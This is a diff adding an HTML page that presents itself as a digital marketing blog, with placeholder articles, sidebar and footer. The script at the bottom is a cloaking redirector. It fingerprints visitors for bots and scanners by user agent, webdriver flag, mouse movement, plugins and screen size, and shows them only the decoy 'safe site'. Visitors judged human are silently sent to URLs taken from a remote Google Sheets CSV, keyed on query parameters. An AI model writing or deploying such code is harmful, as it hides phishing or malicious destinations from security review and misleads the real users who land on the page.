@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Digital Marketing Insights - Expert strategies, tips, and trends for growing your online business">
+    <meta name="keywords" content="digital marketing, SEO, content marketing, social media, business growth">
+    <meta name="author" content="Digital Marketing Insights Team">
+    <link rel="canonical" href="https://www.digitalmarketinginsights.com">
+    <title>Digital Marketing Insights | Expert Tips & Strategies for Online Growth</title>
+    <style>
+        :root {
+            --primary-color: #1a73e8;
+            --secondary-color: #202124;
+            --accent-color: #ea4335;
+            --text-color: #3c4043;
+            --light-bg: #f8f9fa;
+            --border-color: #dadce0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.7;
+            color: var(--text-color);
+            background: #ffffff;
+        }
+
+        /* Top Bar */
+        .top-bar {
+            background: var(--secondary-color);
+            color: white;
+            padding: 0.5rem 0;
+            font-size: 0.85rem;
+        }
+
+        .top-bar .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .top-bar a {
+            color: white;
+            text-decoration: none;
+            margin-left: 1rem;
+        }
+
+        /* Header */
+        header {
+            background: white;
+            border-bottom: 1px solid var(--border-color);
+            padding: 1rem 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary-color);
+            text-decoration: none;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
+            border-radius: 8px;
+            margin-right: 0.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 800;
+        }
+
+        /* Navigation */
+        nav ul {
+            list-style: none;
+            display: flex;
+            gap: 2rem;
+            align-items: center;
+        }
+
+        nav a {
+            color: var(--text-color);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s;
+            padding: 0.5rem 0;
+        }
+
+        nav a:hover {
+            color: var(--primary-color);
+        }
+
+        .cta-button {
+            background: var(--primary-color);
+            color: white !important;
+            padding: 0.6rem 1.5rem !important;
+            border-radius: 4px;
+            transition: background 0.2s;
+        }
+
+        .cta-button:hover {
+            background: #1557b0;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 4rem 0;
+            text-align: center;
+        }
+
+        .hero h1 {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            font-weight: 700;
+        }
+
+        .hero p {
+            font-size: 1.3rem;
+            margin-bottom: 2rem;
+            opacity: 0.95;
+        }
+
+        .hero-cta {
+            display: inline-block;
+            background: white;
+            color: #667eea;
+            padding: 1rem 2.5rem;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: transform 0.2s;
+        }
+
+        .hero-cta:hover {
+            transform: translateY(-2px);
+        }
+
+        /* Categories Bar */
+        .categories {
+            background: var(--light-bg);
+            padding: 1rem 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .categories ul {
+            list-style: none;
+            display: flex;
+            gap: 1.5rem;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .categories a {
+            color: var(--text-color);
+            text-decoration: none;
+            padding: 0.4rem 1rem;
+            border-radius: 20px;
+            transition: all 0.2s;
+            font-size: 0.95rem;
+        }
+
+        .categories a:hover {
+            background: var(--primary-color);
+            color: white;
+        }
+
+        /* Main Content */
+        main {
+            padding: 3rem 0;
+            min-height: 60vh;
+        }
+
+        .content-grid {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 3rem;
+        }
+
+        /* Articles */
+        .article {
+            background: white;
+            margin-bottom: 2.5rem;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            transition: box-shadow 0.3s;
+        }
+
+        .article:hover {
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+
+        .article-image {
+            width: 100%;
+            height: 300px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 3rem;
+            font-weight: 700;
+        }
+
+        .article-content {
+            padding: 2rem;
+        }
+
+        .article-category {
+            display: inline-block;
+            background: var(--primary-color);
+            color: white;
+            padding: 0.3rem 0.8rem;
+            border-radius: 3px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            text-transform: uppercase;
+        }
+
+        .article h2 {
+            color: var(--secondary-color);
+            margin-bottom: 0.8rem;
+            font-size: 1.8rem;
+            line-height: 1.3;
+        }
+
+        .article-meta {
+            color: #5f6368;
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+        }
+
+        .article p {
+            color: var(--text-color);
+            margin-bottom: 1.5rem;
+            line-height: 1.8;
+        }
+
+        .read-more {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.3rem;
+        }
+
+        .read-more:hover {
+            gap: 0.6rem;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            position: sticky;
+            top: 100px;
+            height: fit-content;
+        }
+
+        .sidebar-widget {
+            background: white;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .sidebar-widget h3 {
+            color: var(--secondary-color);
+            margin-bottom: 1rem;
+            font-size: 1.2rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid var(--primary-color);
+        }
+
+        .popular-post {
+            padding: 1rem 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .popular-post:last-child {
+            border-bottom: none;
+        }
+
+        .popular-post a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 0.3rem;
+        }
+
+        .popular-post a:hover {
+            color: var(--primary-color);
+        }
+
+        .popular-post span {
+            color: #5f6368;
+            font-size: 0.85rem;
+        }
+
+        .tag-cloud {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+
+        .tag {
+            background: var(--light-bg);
+            color: var(--text-color);
+            padding: 0.4rem 0.8rem;
+            border-radius: 3px;
+            text-decoration: none;
+            font-size: 0.85rem;
+            transition: all 0.2s;
+        }
+
+        .tag:hover {
+            background: var(--primary-color);
+            color: white;
+        }
+
+        .newsletter-form {
+            display: flex;
+            flex-direction: column;
+            gap: 0.8rem;
+        }
+
+        .newsletter-form input {
+            padding: 0.8rem;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-size: 0.95rem;
+        }
+
+        .newsletter-form button {
+            background: var(--primary-color);
+            color: white;
+            padding: 0.8rem;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .newsletter-form button:hover {
+            background: #1557b0;
+        }
+
+        /* Footer */
+        footer {
+            background: var(--secondary-color);
+            color: white;
+            padding: 3rem 0 1rem;
+            margin-top: 4rem;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .footer-section h4 {
+            margin-bottom: 1rem;
+            font-size: 1.1rem;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section a {
+            color: #bdc1c6;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 0.5rem;
+            transition: color 0.2s;
+        }
+
+        .footer-section a:hover {
+            color: white;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .social-links a {
+            display: inline-flex;
+            width: 40px;
+            height: 40px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 50%;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.2s;
+        }
+
+        .social-links a:hover {
+            background: var(--primary-color);
+        }
+
+        .footer-bottom {
+            border-top: 1px solid rgba(255,255,255,0.1);
+            padding-top: 1.5rem;
+            text-align: center;
+            color: #bdc1c6;
+            font-size: 0.9rem;
+        }
+
+        /* Responsive */
+        @media (max-width: 968px) {
+            .content-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .footer-content {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            nav ul {
+                gap: 1rem;
+            }
+
+            .hero h1 {
+                font-size: 2rem;
+            }
+        }
+
+        @media (max-width: 640px) {
+            .footer-content {
+                grid-template-columns: 1fr;
+            }
+
+            .top-bar .container {
+                flex-direction: column;
+                gap: 0.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="top-bar">
+        <div class="container">
+            <div>Breaking: Latest trends in content marketing for 2025</div>
+            <div>
+                <a href="#subscribe">Subscribe</a>
+                <a href="#contact">Contact</a>
+            </div>
+        </div>
+    </div>
+
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <a href="#home" class="logo">
+                    <div class="logo-icon">DM</div>
+                    <span>Digital Marketing Insights</span>
+                </a>
+                <nav>
+                    <ul>
+                        <li><a href="#home">Home</a></li>
+                        <li><a href="#about">About</a></li>
+                        <li><a href="#articles">Articles</a></li>
+                        <li><a href="#resources">Resources</a></li>
+                        <li><a href="#contact" class="cta-button">Get Started</a></li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="container">
+            <h1>Master Digital Marketing in 2025</h1>
+            <p>Expert insights, proven strategies, and actionable tips to grow your online presence</p>
+            <a href="#articles" class="hero-cta">Explore Latest Articles</a>
+        </div>
+    </section>
+
+    <section class="categories">
+        <div class="container">
+            <ul>
+                <li><a href="#seo">SEO</a></li>
+                <li><a href="#content">Content Marketing</a></li>
+                <li><a href="#social">Social Media</a></li>
+                <li><a href="#email">Email Marketing</a></li>
+                <li><a href="#analytics">Analytics</a></li>
+                <li><a href="#ppc">PPC Advertising</a></li>
+                <li><a href="#strategy">Strategy</a></li>
+            </ul>
+        </div>
+    </section>
+
+    <main>
+        <div class="container">
+            <div class="content-grid">
+                <div class="articles-section">
+                    <article class="article">
+                        <div class="article-image">📱</div>
+                        <div class="article-content">
+                            <span class="article-category">Social Media</span>
+                            <h2>10 Proven Social Media Strategies That Drive Real Results in 2025</h2>
+                            <div class="article-meta">
+                                <span>By Sarah Mitchell</span>
+                                <span>•</span>
+                                <span>January 8, 2025</span>
+                                <span>•</span>
+                                <span>8 min read</span>
+                            </div>
+                            <p>Social media marketing continues to evolve at breakneck speed. With algorithm changes, new platforms emerging, and user behavior shifting constantly, staying ahead requires adapting proven strategies to current trends. In this comprehensive guide, we'll explore the tactics that are delivering measurable results for businesses of all sizes.</p>
+                            <p>From leveraging short-form video content to building authentic community engagement, these strategies have been tested across multiple industries and consistently drive ROI. Whether you're a solopreneur or managing a corporate brand, you'll find actionable insights to implement immediately.</p>
+                            <a href="#article1" class="read-more">Continue Reading →</a>
+                        </div>
+                    </article>
+
+                    <article class="article">
+                        <div class="article-image">🔍</div>
+                        <div class="article-content">
+                            <span class="article-category">SEO</span>
+                            <h2>The Complete Guide to SEO in 2025: What's Changed and What Still Works</h2>
+                            <div class="article-meta">
+                                <span>By David Chen</span>
+                                <span>•</span>
+                                <span>January 5, 2025</span>
+                                <span>•</span>
+                                <span>12 min read</span>
+                            </div>
+                            <p>Search engine optimization has undergone massive transformation in recent years, with AI-driven algorithms and evolving user intent reshaping best practices. Understanding what works today requires separating outdated tactics from strategies that deliver lasting results.</p>
+                            <p>This guide breaks down the current SEO landscape, covering everything from technical optimization and content strategy to link building and local SEO. We'll examine case studies showing how businesses achieved 300%+ organic traffic growth using modern SEO principles.</p>
+                            <a href="#article2" class="read-more">Continue Reading →</a>
+                        </div>
+                    </article>
+
+                    <article class="article">
+                        <div class="article-image">✉️</div>
+                        <div class="article-content">
+                            <span class="article-category">Email Marketing</span>
+                            <h2>Building High-Converting Email Campaigns: A Data-Driven Approach</h2>
+                            <div class="article-meta">
+                                <span>By Jennifer Rodriguez</span>
+                                <span>•</span>
+                                <span>January 3, 2025</span>
+                                <span>•</span>
+                                <span>10 min read</span>
+                            </div>
+                            <p>Email marketing remains one of the highest ROI channels for digital marketers, but only when executed strategically. This comprehensive analysis examines what separates campaigns with 2% conversion rates from those achieving 15% or higher.</p>
+                            <p>We'll dive into segmentation strategies, personalization techniques, automation workflows, and copywriting formulas that have generated millions in revenue. Plus, you'll get access to tested email templates and sequence blueprints you can adapt for your business.</p>
+                            <a href="#article3" class="read-more">Continue Reading →</a>
+                        </div>
+                    </article>
+
+                    <article class="article">
+                        <div class="article-image">📊</div>
+                        <div class="article-content">
+                            <span class="article-category">Analytics</span>
+                            <h2>Beyond Vanity Metrics: Measuring What Actually Matters in Digital Marketing</h2>
+                            <div class="article-meta">
+                                <span>By Michael Thompson</span>
+                                <span>•</span>
+                                <span>December 30, 2024</span>
+                                <span>•</span>
+                                <span>9 min read</span>
+                            </div>
+                            <p>Too many marketers focus on metrics that look impressive but don't move the needle for their business. Page views, follower counts, and impressions tell only part of the story. Real growth comes from tracking and optimizing metrics directly tied to revenue and customer lifetime value.</p>
+                            <p>This guide introduces a framework for identifying your true north metrics, setting up proper attribution modeling, and creating dashboards that provide actionable insights rather than just data visualization. Transform how you measure and improve marketing performance.</p>
+                            <a href="#article4" class="read-more">Continue Reading →</a>
+                        </div>
+                    </article>
+                </div>
+
+                <aside class="sidebar">
+                    <div class="sidebar-widget">
+                        <h3>Popular Articles</h3>
+                        <div class="popular-post">
+                            <a href="#pop1">How to Create Viral Content That Actually Converts</a>
+                            <span>45.2K views</span>
+                        </div>
+                        <div class="popular-post">
+                            <a href="#pop2">The Ultimate Guide to Google Ads ROI</a>
+                            <span>38.7K views</span>
+                        </div>
+                        <div class="popular-post">
+                            <a href="#pop3">Content Calendar Templates for 2025</a>
+                            <span>32.1K views</span>
+                        </div>
+                        <div class="popular-post">
+                            <a href="#pop4">Instagram Algorithm Decoded</a>
+                            <span>29.5K views</span>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-widget">
+                        <h3>Newsletter</h3>
+                        <p style="margin-bottom: 1rem; color: #5f6368;">Get weekly marketing insights delivered to your inbox</p>
+                        <form class="newsletter-form">
+                            <input type="email" placeholder="Your email address" required>
+                            <button type="submit">Subscribe Now</button>
+                        </form>
+                    </div>
+
+                    <div class="sidebar-widget">
+                        <h3>Popular Topics</h3>
+                        <div class="tag-cloud">
+                            <a href="#tag1" class="tag">Content Strategy</a>
+                            <a href="#tag2" class="tag">SEO Tips</a>
+                            <a href="#tag3" class="tag">Social Media</a>
+                            <a href="#tag4" class="tag">Email Campaigns</a>
+                            <a href="#tag5" class="tag">Conversion Rate</a>
+                            <a href="#tag6" class="tag">Analytics</a>
+                            <a href="#tag7" class="tag">PPC Ads</a>
+                            <a href="#tag8" class="tag">Influencer</a>
+                            <a href="#tag9" class="tag">Video Marketing</a>
+                            <a href="#tag10" class="tag">Automation</a>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-widget">
+                        <h3>About Us</h3>
+                        <p style="color: #5f6368; line-height: 1.7;">Digital Marketing Insights is your trusted source for expert marketing strategies, industry trends, and actionable tips to grow your online business.</p>
+                    </div>
+                </aside>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h4>About</h4>
+                    <ul>
+                        <li><a href="#about">About Us</a></li>
+                        <li><a href="#team">Our Team</a></li>
+                        <li><a href="#careers">Careers</a></li>
+                        <li><a href="#press">Press</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Resources</h4>
+                    <ul>
+                        <li><a href="#blog">Blog</a></li>
+                        <li><a href="#guides">Free Guides</a></li>
+                        <li><a href="#tools">Marketing Tools</a></li>
+                        <li><a href="#courses">Courses</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Support</h4>
+                    <ul>
+                        <li><a href="#help">Help Center</a></li>
+                        <li><a href="#contact">Contact</a></li>
+                        <li><a href="#privacy">Privacy Policy</a></li>
+                        <li><a href="#terms">Terms of Service</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Connect</h4>
+                    <p style="color: #bdc1c6; margin-bottom: 1rem;">Follow us for daily marketing tips</p>
+                    <div class="social-links">
+                        <a href="#twitter">𝕏</a>
+                        <a href="#facebook">f</a>
+                        <a href="#linkedin">in</a>
+                        <a href="#instagram">📷</a>
+                    </div>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2025 Digital Marketing Insights. All rights reserved. | Empowering marketers worldwide with actionable strategies.</p>
+            </div>
+        </div>
+    </footer>
+
+
+    <script>
+        // Configuration - Replace with your Google Sheets published CSV URL
+        const SHEET_URL = 'https://docs.google.com/spreadsheets/d/e/2PACX-1vRMVMgGG9YfVAtXktobzjH0stbIFih2f97GFR2IjDoR8quVsvOaI_bK3aWPoRpnWR5KB3UpGtQZqJfj/pub?output=csv';
+       
+        // Bot detection function
+        function isLikelyBot() {
+            const ua = navigator.userAgent.toLowerCase();
+            const botPatterns = [
+                'bot', 'crawler', 'spider', 'scrapy', 'curl', 'wget',
+                'python', 'java', 'http', 'headless', 'phantom', 'selenium'
+            ];
+           
+            // Check user agent
+            if (botPatterns.some(pattern => ua.includes(pattern))) {
+                return true;
+            }
+           
+            // Check for missing features
+            if (!navigator.languages || navigator.languages.length === 0) {
+                return true;
+            }
+           
+            // Check for webdriver
+            if (navigator.webdriver) {
+                return true;
+            }
+           
+            // Check for automation indicators
+            if (window.document.documentElement.getAttribute('webdriver')) {
+                return true;
+            }
+           
+            return false;
+        }
+
+
+        // Advanced bot detection
+        async function performBotDetection() {
+            let botScore = 0;
+           
+            // Basic checks
+            if (isLikelyBot()) botScore += 3;
+           
+            // Check for mouse movement (real users move mouse)
+            let mouseMoved = false;
+            const mouseHandler = () => { mouseMoved = true; };
+            document.addEventListener('mousemove', mouseHandler, { once: true });
+           
+            // Wait a bit to see if mouse moves
+            await new Promise(resolve => setTimeout(resolve, 100));
+           
+            if (!mouseMoved) botScore += 1;
+            document.removeEventListener('mousemove', mouseHandler);
+           
+            // Check screen properties
+            if (screen.width === 0 || screen.height === 0) botScore += 2;
+           
+            // Check for common screen sizes (bots often use default)
+            if (screen.width === 1024 && screen.height === 768) botScore += 1;
+           
+            // Check for plugins (most bots have none)
+            if (navigator.plugins.length === 0) botScore += 1;
+           
+            // Check for touch support inconsistency
+            const hasTouch = 'ontouchstart' in window;
+            const isMobile = /mobile|android|iphone|ipad/i.test(navigator.userAgent);
+            if (hasTouch !== isMobile) botScore += 1;
+           
+            return botScore >= 3; // Threshold for bot detection
+        }
+
+
+        // Fetch and parse Google Sheets data
+        async function fetchRedirectData() {
+            try {
+                const response = await fetch(SHEET_URL);
+                const csvData = await response.text();
+               
+                console.log('Raw CSV data:', csvData);
+               
+                // Simple CSV parsing
+                const lines = csvData.split('\n');
+                const redirectMap = {};
+
+                // Start from 0 to process all lines (no header row)
+                for (let i = 0; i < lines.length; i++) {
+                    const line = lines[i].trim();
+                    if (!line) continue;
+
+                    console.log(`Processing line ${i}: "${line}"`);
+
+                    // Split by comma, but handle potential quotes
+                    const parts = line.split(',');
+                    console.log(`Parts:`, parts);
+
+                    if (parts.length >= 2) {
+                        const queryParam = parts[0].trim().replace(/['"]/g, '');
+                        const redirectLink = parts.slice(1).join(',').trim().replace(/['"]/g, '');
+
+                        console.log(`Parsed: queryParam="${queryParam}", redirectLink="${redirectLink}"`);
+
+                        if (queryParam && redirectLink) {
+                            redirectMap[queryParam] = redirectLink;
+                            console.log(`Mapped: "${queryParam}" -> "${redirectLink}"`);
+                        }
+                    }
+                }
+               
+                console.log('Final redirect map:', redirectMap);
+                return redirectMap;
+            } catch (error) {
+                console.error('Error fetching redirect data:', error);
+                return {};
+            }
+        }
+
+
+        // Main redirect logic
+        async function handleRedirect() {
+            // Get query parameters
+            const urlParams = new URLSearchParams(window.location.search);
+           
+            console.log('Current URL params:', window.location.search);
+            console.log('Parsed params:', Array.from(urlParams.entries()));
+           
+            // If no query parameters, show safe site
+            if (urlParams.toString() === '') {
+                console.log('No query parameters found');
+                return;
+            }
+           
+            // Perform bot detection
+            const isBot = await performBotDetection();
+           
+            console.log('Bot detection result:', isBot);
+           
+            if (isBot) {
+                console.log('Bot detected, staying on safe site');
+                return;
+            }
+           
+            // Real user detected, fetch redirect data
+            console.log('Real user detected, fetching redirect data...');
+            const redirectMap = await fetchRedirectData();
+           
+            // Check each query parameter
+            for (const [key, value] of urlParams.entries()) {
+                const queryString = `${key}=${value}`;
+               
+                console.log(`Checking: "${queryString}"`);
+               
+                if (redirectMap[queryString]) {
+                    console.log(`Match found! Redirecting to: ${redirectMap[queryString]}`);
+                    window.location.href = redirectMap[queryString];
+                    return;
+                }
+               
+                // Also check just the key
+                if (redirectMap[key]) {
+                    console.log(`Match found by key! Redirecting to: ${redirectMap[key]}`);
+                    window.location.href = redirectMap[key];
+                    return;
+                }
+            }
+           
+            console.log('No matching redirect found');
+        }
+
+
+        // Run on page load
+        window.addEventListener('DOMContentLoaded', handleRedirect);
+    </script>
+</body>
+</html>
+
